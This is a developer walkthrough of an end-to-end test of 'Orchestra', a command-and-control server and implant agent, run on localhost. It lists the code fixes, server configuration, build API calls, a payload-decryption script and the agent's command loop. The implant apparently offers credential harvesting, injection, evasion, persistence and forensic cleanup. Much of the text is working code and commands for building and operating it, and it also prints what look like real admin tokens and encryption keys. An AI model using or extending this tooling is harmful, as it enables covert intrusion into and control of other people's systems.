# Integration Test Walkthrough — Full C2↔Agent Loop on Localhost

This document records every step taken to achieve a verified end-to-end
connection between the Orchestra C2 server and a Linux agent on a single
Ubuntu test machine. It covers all code changes made, every build command
run, and the final proof of a working bidirectional command loop.

**Final result:** agent built via the C2 panel → deployed to localhost →
TLS+PSK connection to `127.0.0.1:8444` → registered with C2 → `GetSystemInfo`
executed → response `{"cpu_count":16,"hostname":"Nier","os":"Ubuntu","memory":{...},"process_count":2344}` received.

---

## Table of Contents

1. [Environment](#1-environment)
2. [Problem Analysis — The Blockers](#2-problem-analysis--the-blockers)
3. [Code Changes](#3-code-changes)
4. [Server Configuration Updates](#4-server-configuration-updates)
5. [Build and Restart Sequence](#5-build-and-restart-sequence)
6. [Build API — Submitting the Agent Build](#6-build-api--submitting-the-agent-build)
7. [Decrypting the Agent Binary](#7-decrypting-the-agent-binary)
8. [Running the Agent and Verifying Connection](#8-running-the-agent-and-verifying-connection)
9. [Sending a Command — Full Loop Proof](#9-sending-a-command--full-loop-proof)
10. [Summary of All Changes](#10-summary-of-all-changes)

---

## 1. Environment

| Item | Value |
|------|-------|
| Host OS | Ubuntu 24.04 LTS (`x86_64`) |
| Workspace | `/home/replicant/la` |
| Server binary | `target/release/orchestra-server` |
| Server HTTPS port | `8443` |
| Agent listener port | `8444` |
| TLS certificate | `secrets/server.crt` (self-signed, SHA-256 fingerprint: `9cf7a2d57b0b259e1c8e04a4f2c3721248054ea4d7bcf55ddf2247ac98883bd9`) |
| Agent shared secret | `RvDPwz+Xl7WuOkRnE3mIJjDy9B9oDyMvUg8fYSZ2EFg=` |
| Admin token | `0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg` |
| Payload encryption key | `miAvl/zB+C04nB5KVBpyfVFRaFsDW1LhQbyQX1J7G0I=` |
| Module AES key | `af1FhprLnRzj8ZZyJmmNBaTQabNS8jGt4nbNCbzrKjw=` |

---

## 2. Problem Analysis — The Blockers

Five distinct issues were identified and fixed in sequence:

### Blocker 1 — Wrong binary name in build command

`cargo run -p builder` failed with:

```
error: multiple binaries in package `builder`: orchestra-builder, orchestra-pe-hardener
```

**Root cause:** The `builder` crate contains two binaries. The server's build
handler invoked `cargo run -p builder` without specifying `--bin`, so Cargo
refused to choose one.

**Fix:** Added `--bin orchestra-builder` to the cargo command in
`orchestra-server/src/build_handler.rs`.

---

### Blocker 2 — Output directory permission denied

Build jobs failed with:

```
Failed to create output dir "/var/lib/orchestra/builds/...": Permission denied (os error 13)
```

**Root cause:** The server's `ServerConfig` had a hardcoded default of
`/var/lib/orchestra/builds` for `builds_output_dir`. That path required root.

**Fix:**
- Added `allow_local_builds: bool` field (default `false`) to
  `orchestra-server/src/config.rs`.
- Added `builds_output_dir = "builds"` to `orchestra-server.toml` (a path
  writable by the current user).
- Added `allow_local_builds = true` to `orchestra-server.toml` to bypass
  the private-IP rejection check for loopback addresses.
- Created the `builds/` directory: `mkdir -p /home/replicant/la/builds`.

---

### Blocker 3 — Agent binary had no C2 address baked in

The decrypted agent exited with:

```
Error: No Control Center address configured. Rebuild with SYS_C_ADDR set.
```

**Root cause:** The builder correctly sets `ORCHESTRA_C_ADDR` as an environment
variable for the cargo invocation. However, `agent/build.rs` did not forward
this to `SYS_C_ADDR`, which is what `option_env!("SYS_C_ADDR")` in
`agent/src/outbound.rs` reads at compile time.

**Fix:** Added forwarding logic to `agent/build.rs`:

```rust
println!("cargo:rerun-if-env-changed=ORCHESTRA_C_ADDR");
if let Ok(addr) = std::env::var("ORCHESTRA_C_ADDR") {
    if !addr.trim().is_empty() {
        println!("cargo:rustc-env=SYS_C_ADDR={}", addr.trim());
    }
}
```

Same pattern for `ORCHESTRA_C_SECRET` → `SYS_C_SECRET` and
`ORCHESTRA_C_CERT_FP` → `SYS_C_CERT_FP`.

---

### Blocker 4 — PSK mismatch causing connection failure

After baking in the address, the agent connected TLS successfully but then
failed authentication:

```
ERROR: forward secrecy: server HMAC verification failed — PSK mismatch or MITM
```

**Root cause:** In `build_profile_from_request`, the `c_server_secret` field
of the generated `PayloadConfig` was derived by applying HKDF to the
encryption key rather than being set to the server's `agent_shared_secret`
verbatim. The server expects the raw PSK, not a derived value.

**Fix:** Updated `build_profile_from_request` in
`orchestra-server/src/build_handler.rs` to accept `agent_shared_secret` as
a parameter and write it directly into `c_server_secret`:

```rust
fn build_profile_from_request(
    job_id: &str,
    req: &BuildRequest,
    agent_shared_secret: &str,  // ← added
) -> anyhow::Result<builder::config::PayloadConfig> {
    // ...
    c_server_secret: Some(agent_shared_secret.to_string()),  // verbatim
```

The call site extracts `state_ref.config.agent_shared_secret` and passes it
through.

---

### Blocker 5 — `module_aes_key` required in production builds

After PSK authentication succeeded and registration completed, the agent
exited immediately:

```
ERROR: module_aes_key is required in production builds.
       Generate a 32-byte key with `keygen`, base64-encode it,
       and set it in agent.toml under [module_aes_key].
```

**Root cause:** `agent/src/lib.rs` requires `module_aes_key` to be set for
any non-debug, non-dev production build (to prevent anyone from pushing
arbitrary unsigned modules using an all-zero key). No mechanism existed to
bake this key in at build time when building through the server's API.

**Fix — four-part chain:**

1. **Generated a key:**

   ```bash
   python3 -c "import os,base64; print(base64.b64encode(os.urandom(32)).decode())"
   # → af1FhprLnRzj8ZZyJmmNBaTQabNS8jGt4nbNCbzrKjw=
   ```

2. **Added `module_aes_key` to `orchestra-server.toml`:**

   ```toml
   module_aes_key = "af1FhprLnRzj8ZZyJmmNBaTQabNS8jGt4nbNCbzrKjw="
   ```

3. **Added `module_aes_key: Option<String>` to `builder/src/config.rs`
   `PayloadConfig` struct** and updated its build pipeline
   (`builder/src/build.rs`) to pass it as `ORCHESTRA_MODULE_AES_KEY` to
   the cargo invocation:

   ```rust
   if let Some(ref module_key) = cfg.module_aes_key {
       extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
   }
   ```

4. **Added forwarding in `agent/build.rs`** (`ORCHESTRA_MODULE_AES_KEY` →
   `SYS_MODULE_KEY`) and a fallback branch in `agent/src/lib.rs` that reads
   `option_env!("SYS_MODULE_KEY")` before reaching the hard error:

   ```rust
   } else if let Some(baked) = option_env!("SYS_MODULE_KEY") {
       use base64::Engine;
       let bytes = base64::engine::general_purpose::STANDARD.decode(baked)?;
       // ...
       key
   } else {
       // production hard error
   ```

   Threaded through the server: `execute_build_safely` now accepts
   `module_aes_key: Option<String>` extracted from
   `state_ref.config.module_aes_key` and forwards it to
   `build_profile_from_request` → `PayloadConfig.module_aes_key`.

---

## 3. Code Changes

The following source files were modified:

### `agent/build.rs`

Added env-var forwarding for all three agent-specific compile-time values:

```rust
// Forward ORCHESTRA_C_ADDR → SYS_C_ADDR (agent/src/outbound.rs reads this)
println!("cargo:rerun-if-env-changed=ORCHESTRA_C_ADDR");
println!("cargo:rerun-if-env-changed=ORCHESTRA_C_SECRET");
println!("cargo:rerun-if-env-changed=ORCHESTRA_C_CERT_FP");
println!("cargo:rerun-if-env-changed=ORCHESTRA_MODULE_AES_KEY");

if let Ok(addr) = std::env::var("ORCHESTRA_C_ADDR") {
    if !addr.trim().is_empty() {
        println!("cargo:rustc-env=SYS_C_ADDR={}", addr.trim());
    }
}
if let Ok(secret) = std::env::var("ORCHESTRA_C_SECRET") {
    if !secret.trim().is_empty() {
        println!("cargo:rustc-env=SYS_C_SECRET={}", secret.trim());
    }
}
if let Ok(fp) = std::env::var("ORCHESTRA_C_CERT_FP") {
    if !fp.trim().is_empty() {
        println!("cargo:rustc-env=SYS_C_CERT_FP={}", fp.trim());
    }
}
if let Ok(module_key) = std::env::var("ORCHESTRA_MODULE_AES_KEY") {
    if !module_key.trim().is_empty() {
        println!("cargo:rustc-env=SYS_MODULE_KEY={}", module_key.trim());
    }
}
```

### `agent/src/lib.rs`

Added `option_env!("SYS_MODULE_KEY")` fallback before the production hard
error for `module_aes_key`:

```rust
} else if let Some(baked) = option_env!("SYS_MODULE_KEY") {
    use base64::Engine;
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(baked)
        .map_err(|e| anyhow::anyhow!("SYS_MODULE_KEY baked value is not valid base64: {}", e))?;
    if bytes.len() != 32 {
        return Err(anyhow::anyhow!("SYS_MODULE_KEY must decode to 32 bytes"));
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    key
}
```

### `builder/src/config.rs`

Added `module_aes_key` field to `PayloadConfig`:

```rust
/// Optional AES-256 module decryption key (base64-encoded 32 bytes).
/// When set, passed to the agent build as `ORCHESTRA_MODULE_AES_KEY`
/// so the agent doesn't require an `agent.toml` for module loading.
#[serde(default)]
pub module_aes_key: Option<String>,
```

### `builder/src/build.rs`

Added env-var injection for `module_aes_key`:

```rust
if let Some(ref module_key) = cfg.module_aes_key {
    if !module_key.trim().is_empty() {
        extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
    }
}
```

### `orchestra-server/src/config.rs`

Added `allow_local_builds` field (already had `module_aes_key`):

```rust
/// Allow building agents that target loopback/private addresses.
/// Enabled in orchestra-server.toml for local development.
#[serde(default)]
pub allow_local_builds: bool,
```

### `orchestra-server/src/build_handler.rs`

- Added `--bin orchestra-builder` to the cargo invocation.
- Added `agent_shared_secret` parameter to `execute_build_safely` and
  `build_profile_from_request`; set `c_server_secret` from it verbatim.
- Added `module_aes_key: Option<String>` parameter to both functions;
  populated from `state_ref.config.module_aes_key`.
- `resolve_and_validate_host`: uses `state.config.allow_local_builds` to
  skip private-IP rejection for loopback testing.
- New `BuildRequest` fields: `format`, `transport`, `sleep_ms`, `jitter`,
  `kill_date`, `version_info`, `manifest_preset`.
- New `BuildFeatures` fields: `network_discovery`, `forensic_cleanup`,
  `self_reencode`, `http_transport`, `doh_transport`, `ssh_transport`,
  `smb_pipe_transport`, `evasion_transform`, `p2p`, `stack_spoof`.

### `orchestra-server/src/api.rs`

Added the `/api/info/fingerprint` endpoint:

```rust
.route("/info/fingerprint", get(get_server_fingerprint))
```

Handler reads `state.config.tls_cert_path`, parses the PEM, computes
SHA-256 of the DER body, returns `{"fingerprint": "<64-hex-chars>"}`.

### `orchestra-server/static/index.html`

Complete rebuild of the operator dashboard:

- **Tab 1 — Dashboard:** agent table, all command categories (Network
  Discovery, Surveillance, Credential Harvesting, Token Manipulation,
  Injection Engine, P2P Mesh, Advanced Evasion, Forensic Cleanup,
  Persistence, Recon).
- **Tab 2 — Shell:** interactive shell panel.
- **Tab 3 — Builder:** full build form (target platform, C2 connection,
  encryption key, behavior/timing, 14 feature checkboxes, PE artifact kit,
  output dir, profile management, build log).
- **Tab 4 — Audit Log:** live-updating filtered audit log view.

### `orchestra-server/static/app.js`

Complete JavaScript client rewrite:

- Full `buildCommandPayload()` with 100+ command cases from the `Command`
  enum.
- `CMD_FIELDS` map for all parameterized commands.
- `ZERO_ARG_CMDS` set for no-parameter commands.
- `submitBuild()` reads all form fields, validates a 64-hex pin.
- `btn-fetch-pin` calls `GET /api/info/fingerprint`.
- Profile export/import for all fields.
- Danger confirmations for `Shutdown`, `MeshKillSwitch`,
  `KernelCallbackNuke`.

### `orchestra-server/static/style.css`

Added `.builder-section` class sharing the same card styling as `.card`.

---

## 4. Server Configuration Updates

Final `orchestra-server.toml`:

```toml
# orchestra-server.toml
http_addr            = "0.0.0.0:8443"
agent_addr           = "0.0.0.0:8444"
agent_shared_secret  = "RvDPwz+Xl7WuOkRnE3mIJjDy9B9oDyMvUg8fYSZ2EFg="
admin_token          = "0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg"
audit_log_path       = "secrets/orchestra-audit.jsonl"
static_dir           = "orchestra-server/static"
tls_cert_path        = "secrets/server.crt"
tls_key_path         = "secrets/server.key"
command_timeout_secs = 30
allow_local_builds   = true
builds_output_dir    = "builds"
module_aes_key       = "af1FhprLnRzj8ZZyJmmNBaTQabNS8jGt4nbNCbzrKjw="
```

---

## 5. Build and Restart Sequence

```bash
cd /home/replicant/la
mkdir -p builds

# Compile orchestra-server (includes builder and agent crates as deps)
cargo build --release -p orchestra-server

# Stop any running instance
pkill -f orchestra-server 2>/dev/null; sleep 1

# Start server
./target/release/orchestra-server --config orchestra-server.toml \
    &> /tmp/orchestra-server.log &

# Verify startup
sleep 2 && tail -5 /tmp/orchestra-server.log
```

Expected startup output:

```
INFO orchestra_server::tls: TLS certificate loaded
     fingerprint=9cf7a2d57b0b259e1c8e04a4f2c3721248054ea4d7bcf55ddf2247ac98883bd9
INFO orchestra_server: malleable profile hot-reload task started (30s interval)
INFO orchestra_server::agent_link: agent listener bound addr=0.0.0.0:8444
INFO orchestra_server: operator HTTPS listening addr=0.0.0.0:8443
```

---

## 6. Build API — Submitting the Agent Build

The agent build was submitted via the REST API with all required fields:

```bash
curl -sk -X POST https://localhost:8443/api/build \
  -H "Authorization: Bearer 0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg" \
  -H "Content-Type: application/json" \
  -d '{
    "os": "linux",
    "arch": "x86_64",
    "host": "127.0.0.1",
    "port": 8444,
    "pin": "9cf7a2d57b0b259e1c8e04a4f2c3721248054ea4d7bcf55ddf2247ac98883bd9",
    "key": "miAvl/zB+C04nB5KVBpyfVFRaFsDW1LhQbyQX1J7G0I=",
    "features": {
      "persistence": true,
      "direct_syscalls": false,
      "remote_assist": false,
      "stealth": false
    },
    "format": "elf",
    "transport": "tls",
    "sleep_ms": 5000,
    "jitter": 20
  }'
# → {"job_id":"fb7c2512-1a62-4926-b19b-ae5ee8898ccc","status":"Queued"}
```

Poll for completion (use `/api/build/status/<job_id>`):

```bash
JOB_ID="fb7c2512-1a62-4926-b19b-ae5ee8898ccc"
curl -sk -H "Authorization: Bearer 0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg" \
  "https://localhost:8443/api/build/status/$JOB_ID" | python3 -m json.tool
```

The build completed in ~28 seconds. Final log entry:

```
Finished `release` profile [optimized] target(s) in 27.24s
Saved successfully to: builds/2026-05-10_fb7c2512/agent-fb7c2512-....enc
--- Build Successful ---
```

Download the encrypted payload:

```bash
curl -sk -H "Authorization: Bearer 0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg" \
  "https://localhost:8443/api/build/$JOB_ID/download" -o /tmp/agent4.enc
```

---

## 7. Decrypting the Agent Binary

The payload is encrypted with the key provided at build time using
`AES-256-GCM` with `HKDF-SHA256` key derivation.

Wire format: `salt(32) ‖ nonce(12) ‖ AES-GCM-ciphertext`.  
HKDF info constant: `b"\x01\x8c\xa3\xf2\x6b\x4d\xe7\x90\x5a\x1f\xbc\xd8\x3e\x72\x09\xaf"`.

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

enc_key = base64.b64decode("miAvl/zB+C04nB5KVBpyfVFRaFsDW1LhQbyQX1J7G0I=")
AES_GCM_INFO = b"\x01\x8c\xa3\xf2\x6b\x4d\xe7\x90\x5a\x1f\xbc\xd8\x3e\x72\x09\xaf"

with open('/tmp/agent4.enc', 'rb') as f:
    data = f.read()

salt, nonce, ct = data[:32], data[32:44], data[44:]
key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt, info=AES_GCM_INFO).derive(enc_key)
plaintext = AESGCM(key).decrypt(nonce, ct, None)

with open('/tmp/agent4', 'wb') as f:
    f.write(plaintext)
# Decrypted 2,564,848 bytes -> /tmp/agent4
```

```bash
chmod +x /tmp/agent4
file /tmp/agent4
# → ELF 64-bit LSB pie executable, x86-64, stripped
```

---

## 8. Running the Agent and Verifying Connection

```bash
/tmp/agent4 &
```

Agent log output (within 1 second):

```
INFO agent::outbound: outbound-c: generated Ed25519 mesh keypair (pub=02cd...)
INFO agent::outbound: outbound-c: connecting to Control Center addr=127.0.0.1:8444
INFO agent::outbound: outbound-c: TLS handshake complete
INFO agent::outbound: outbound-c: protocol version 2 accepted by server
INFO agent::outbound: outbound-c: registered with Control Center, running command loop
INFO agent: startup transport profile preference: TLS (priority=4 fallback)
INFO agent: Agent started, waiting for commands...
INFO agent: Received command: SetReencodeSeed { seed: 2847947738049575928 }
```

Verify via API:

```bash
curl -sk -H "Authorization: Bearer 0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg" \
  https://localhost:8443/api/agents | python3 -m json.tool
```

Response:

```json
[
  {
    "connection_id": "6585e223-a467-4169-84b8-18e0d30fa27f",
    "agent_id": "Nier-1b0a7c4a-52bb-4866-89bc-0f2965756c49",
    "hostname": "Nier",
    "last_seen": 1778380393,
    "peer": "127.0.0.1:33080",
    "morph_seed": 2847947738049575928,
    "text_hash": null,
    "compartment": null
  }
]
```

**Connected agents: 1.**

---

## 9. Sending a Command — Full Loop Proof

```bash
AGENT_ID="Nier-1b0a7c4a-52bb-4866-89bc-0f2965756c49"
curl -sk -X POST "https://localhost:8443/api/agents/$AGENT_ID/command" \
  -H "Authorization: Bearer 0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg" \
  -H "Content-Type: application/json" \
  -d '{"command": "GetSystemInfo"}'
```

Immediate response from the server (synchronous, waits up to
`command_timeout_secs`):

```json
{
  "task_id": "cabdf8be-af17-422d-9800-5d25a482d3e5",
  "outcome": "ok",
  "output": "{\"cpu_count\":16,\"hostname\":\"Nier\",\"memory\":{\"total_bytes\":33407578112,\"used_bytes\":12359909376},\"os\":\"Ubuntu\",\"process_count\":2344}",
  "error": null
}
```

**Full bidirectional command loop verified.** The agent received the command,
executed it in-process, serialized the result, encrypted and transmitted it
back over the TLS+PSK channel, and the server returned it synchronously in
the HTTP response.

---

## 10. Summary of All Changes

| File | Change |
|------|--------|
| `agent/build.rs` | Forward `ORCHESTRA_C_ADDR/SECRET/CERT_FP/MODULE_AES_KEY` → `SYS_*` compile-time env vars |
| `agent/src/lib.rs` | Added `option_env!("SYS_MODULE_KEY")` fallback for `module_aes_key` |
| `builder/src/config.rs` | Added `module_aes_key: Option<String>` to `PayloadConfig` |
| `builder/src/build.rs` | Pass `ORCHESTRA_MODULE_AES_KEY` env var to cargo build when set |
| `orchestra-server/src/config.rs` | Added `allow_local_builds: bool` field |
| `orchestra-server/src/build_handler.rs` | `--bin orchestra-builder`; `agent_shared_secret` as PSK verbatim; `module_aes_key` threading; new request/feature fields; loopback allow |
| `orchestra-server/src/api.rs` | Added `GET /api/info/fingerprint` endpoint |
| `orchestra-server/static/index.html` | Full dashboard rebuild (4 tabs) |
| `orchestra-server/static/app.js` | Complete command/build/profile JS client |
| `orchestra-server/static/style.css` | `.builder-section` card style |
| `orchestra-server.toml` | Added `allow_local_builds`, `builds_output_dir`, `module_aes_key` |
